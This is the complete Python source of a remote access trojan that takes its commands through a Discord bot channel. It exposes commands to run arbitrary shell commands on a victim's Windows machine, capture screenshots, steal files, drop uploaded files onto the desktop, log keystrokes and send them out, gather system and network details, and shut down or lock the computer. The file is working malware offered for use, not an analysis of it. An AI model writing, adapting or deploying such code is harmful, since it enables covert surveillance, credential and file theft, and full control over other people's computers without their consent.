import discord
import subprocess
import os
import platform
import psutil
import mss
import socket
import tempfile
import ctypes
import pyautogui
import time
import random
import sys
import webbrowser
from pynput import keyboard
import requests
from dotenv import load_dotenv

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

env_path = resource_path(".env")
load_dotenv(env_path)

BOT_TOKEN = os.getenv("BOT_TOKEN")
TARGET_CHANNEL = "rat-channel"

keylog_listener = None
keylog_buffer = []

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

SYSTEM_ID = f"{os.getenv('USERNAME')}@{os.getenv('COMPUTERNAME')}"


def execute_command(command): #execute system command (from CMD) and return output 
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        return result.decode('latin-1', errors='ignore')
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('latin-1', errors='ignore')}"
    except Exception as e:
        return f"Exception: {str(e)}"
    
def get_system_info():
    info = []
    info.append("============ SYSTEM RECON =============")
    info.append("\n----------Computer and User Information----------")
    try: # Get basic system info
        info.append(f"User: {os.getenv('USERNAME')}")
        info.append(f"Computer Name: {os.getenv('COMPUTERNAME')}")
        info.append(f"OS: {platform.system()} {platform.release()} (version {platform.version()})")
        info.append(f"Hostname: {socket.gethostname()}")
    except Exception as e:
        info.append(f"Error retrieving basic info: {e}")

    try: # Get computer info
        info.append(f"Processor: {platform.processor()}")
        info.append(f"Machine: {platform.machine()}")
        info.append(f"RAM: {round(psutil.virtual_memory().total / (1024**3))} GB")

        cpu_name = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
        info.append(f"CPU: {cpu_name}")

        gpu_info = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')
        gpus = [line.strip() for line in gpu_info if line.strip() and "Name" not in line]
        info.append(f"GPU(s): {', '.join(gpus)}")
    except: pass


    info.append("\n---------- Network Information ----------")

    try: # Get local IP
        local_ip = socket.gethostbyname(socket.gethostname())
        info.append(f"Local IP: {local_ip}")
    except Exception as e:
        info.append("Local IP: Unavailable {e}")   

    try: # Get public IP
        ip = requests.get('https://api.ipify.org',timeout=3).text
        info.append(f"Public IP: {ip}")
    except: info.append("Public IP: Unavailable")

    info.append("\n---------- Computer programs and files ----------")

    try: # Desktop files
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        files = os.listdir(desktop_path)
        files_only = [f for f in files if os.path.isfile(os.path.join(desktop_path, f))]
        info.append("\n------ Desktop Files ------")
        info.append(f"Desktop Files: {', '.join(files_only[:20])} {'...' if len(files_only) > 20 else ''}")
    except: pass

    info.append("============= END OF RECON ===============\n\n")
    return "\n".join(info)

def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keylog_buffer.append(" ")
        elif key == keyboard.Key.enter:
            keylog_buffer.append("\n")
        else:
            keylog_buffer.append(f"[{key.name}]")

    

@client.event
async def on_ready():
    print(f'[+] RAT Online: {client.user}')
    for guild in client.guilds:
        for channel in guild.text_channels:
            if channel.name == TARGET_CHANNEL:
                await channel.send(f"🐍 **New Session Connected!**\nTarget: `{SYSTEM_ID}`\nIP: `{socket.gethostbyname(socket.gethostname())}`\nOS: `{platform.system()} {platform.release()}`")
                break

@client.event
async def on_message(message):

    global keylog_listener, keylog_buffer

    if message.author == client.user:
        return

    if message.channel.name != TARGET_CHANNEL:
        return
    
    args = message.content.split(" ")
    if len(args) < 2:
        return
    
    command = args[0].lower()
    target_computer = args[1]

    if target_computer != SYSTEM_ID and target_computer != "all":
        return

    if message.content.startswith("!help"):
        help_msg = """
        **🐍 RAT Command Menu**
        `!cmd <User@PC> <command>` - Execute terminal command
        `!screenshot <User@PC>` - Take a screenshot
        `!download <User@PC> <path>` - Download file from victim
        `!info <User@PC>` - Get basic system info
        `!kill <User@PC>` - Stop the RAT connection
        `!upload <User@PC>` - Upload a file to the victims desktop
        `!msgbox <User@PC> <message>` - Display a message box on the victim's screen
        `!speak <User@PC> <message>` - Make the victim's computer speak a message
        `!website <User@PC> <url>` - Open a website on the victim's computer
        `!mouse <User@PC>` - Move the victim's mouse cursor randomly for 10 seconds
        `!minize <User@PC>` - Minimize all windows on the victim's computer
        `!shutdown <User@PC>` - Shutdown the victim's computer
        `!restart <User@PC>` - Restart the victim's computer
        `!lock <User@PC>` - Lock the victim's computer
        `!keylogger_start <User@PC>` - Start keylogging on the victim's computer
        `!keylogger_stop <User@PC>` - Stop keylogging and retrieve the log file

        """
        await message.channel.send(help_msg)

    elif message.content.startswith("!cmd"):
        command = " ".join(args[2:])
        await message.channel.send(f"⚡ Executing: `{command}` on `{SYSTEM_ID}`...")

        output = execute_command(command)
        if len(output) > 1900:
            with open("output.txt", "w") as f:
                f.write(output)
            await message.channel.send("Output too long, sending file:", file=discord.File("output.txt"))
            os.remove("output.txt")
        else:
            await message.channel.send(f"```{output}```")

    elif message.content.startswith("!screenshot"):
        path = os.path.join(tempfile.gettempdir(), "screenshot.png")
        with mss.mss() as sct:
            sct.shot(mon=-1,output=path)
        await message.channel.send(f"📸 Screenshot taken from {SYSTEM_ID}:", file=discord.File(path))
        os.remove(path)

    elif message.content.startswith("!info"):
        info = get_system_info()
        if len(info) > 1990:
            with open("system_info.txt", "w") as f:
                f.write(info)
            await message.channel.send("System info too long, sending file:", file=discord.File("system_info.txt"))
            os.remove("system_info.txt")
        else:
            await message.channel.send(f"{SYSTEM_ID} info: \n{info}")

    elif message.content.startswith("!download"):
        file_path = " ".join(args[2:])
        if os.path.isfile(file_path):
            await message.channel.send(f"📁 Downloading file from {SYSTEM_ID}: `{file_path}`", file=discord.File(file_path))
        else:
            await message.channel.send(f"❌ File not found: `{file_path}`")
    
    elif message.content.startswith("!kill"):
        await message.channel.send(f"💀 Terminating RAT on `{SYSTEM_ID}`. Goodbye!")
        await client.close()
        exit()

    elif message.content.startswith("!keylogger_start"):
        if keylog_listener is None:
            keylog_buffer = []
            keylog_listener = keyboard.Listener(on_press=on_press)
            keylog_listener.start()
            await message.channel.send(f"📝 Keylogger started on `{SYSTEM_ID}`.")
        else:
            await message.channel.send(f"❗ Keylogger is already running on `{SYSTEM_ID}`.")

    elif message.content.startswith("!keylogger_stop"):
        if keylog_listener is not None:
            keylog_listener.stop()
            keylog_listener = None
            log_content = "".join(keylog_buffer)
            if log_content:
                with open("keylog.txt", "w") as f:
                    f.write(log_content)
                await message.channel.send(f"📝 Keylogger stopped. Sending log from `{SYSTEM_ID}`:", file=discord.File("keylog.txt"))
                os.remove("keylog.txt")
            else:
                await message.channel.send(f"📝 Keylogger stopped on `{SYSTEM_ID}`, but no keys were logged.")
            keylog_buffer = []
        else:
            await message.channel.send(f"❗ Keylogger is not running on `{SYSTEM_ID}`.")


    elif message.content.startswith("!upload"):
        if not message.attachments:
            await message.channel.send("❗ Please attach a file to upload.")
            return
        for attachment in message.attachments:
            save_path = os.path.join(os.path.expanduser("~"), "Desktop", attachment.filename)
            try:
                await attachment.save(save_path)
                await message.channel.send(f"📤 File `{attachment.filename}` uploaded to `{save_path}` on `{SYSTEM_ID}`.")
            except Exception as e:
                await message.channel.send(f"❌ Failed to upload `{attachment.filename}`: {e}")

    
    elif message.content.startswith("!msgbox "):
        msg = " ".join(args[2:])
        ctypes.windll.user32.MessageBoxW(0, msg, "Message from RAT", 0x10 | 0x0)
        await message.channel.send(f"💬 Message box displayed on `{SYSTEM_ID}`.")

    elif message.content.startswith("!speak "):
        text = " ".join(args[2:])
        ps_script = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{text}')"
        subprocess.Popen(["powershell", ps_script], creationflags=subprocess.CREATE_NO_WINDOW)
        await message.channel.send(f"🗣️ Speaking on `{SYSTEM_ID}`...")

    elif message.content.startswith("!website "):
        url = args[2]
        webbrowser.open(url)
        await message.channel.send(f"🌐 Opening website `{url}` on `{SYSTEM_ID}`.")

    elif message.content.startswith("!mouse"):
        await message.channel.send(f"🐭 Moving mouse cursor randomly on `{SYSTEM_ID}` for 10 seconds...")
        time_end = time.time() + 10
        while time.time() < time_end:
            x = random.randint(0, pyautogui.size().width)
            y = random.randint(0, pyautogui.size().height)
            pyautogui.moveTo(x, y)
            time.sleep(0.1)


    elif message.content.startswith("!minize"):
        pyautogui.hotkey('win', 'd')
        await message.channel.send(f"🗔 Minimized all windows on `{SYSTEM_ID}`.")

    elif message.content.startswith("!shutdown"):
        execute_command("shutdown /s /t 3")
        await message.channel.send(f"🔌 Shutting down `{SYSTEM_ID}`...")

    elif message.content.startswith("!restart"):
        execute_command("shutdown /r /t 3")
        await message.channel.send(f"🔄 Restarting `{SYSTEM_ID}`...")

    elif message.content.startswith("!lock"):
        execute_command("rundll32.exe user32.dll,LockWorkStation")
        await message.channel.send(f"🔒 Locking `{SYSTEM_ID}`...")

    else:
        await message.channel.send("❓ Unknown command. Type `!help` for the command list.")


def start_rat():
    try:        
        client.run(BOT_TOKEN)
    except Exception as e:
        print(f"Error starting RAT: {e}")

if __name__ == "__main__":
    start_rat()

        
    